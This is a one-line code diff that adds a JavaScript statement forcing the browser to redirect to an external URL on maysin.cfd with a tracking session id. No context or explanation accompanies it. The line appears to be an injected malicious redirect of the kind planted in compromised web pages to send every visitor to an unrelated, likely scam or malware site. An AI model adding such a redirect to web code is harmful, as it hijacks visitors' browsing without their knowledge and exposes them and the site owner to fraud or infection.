@@ -1,0 +1,1 @@
+window.location.href = "https://maysin.cfd/URW/go?sid=7747";
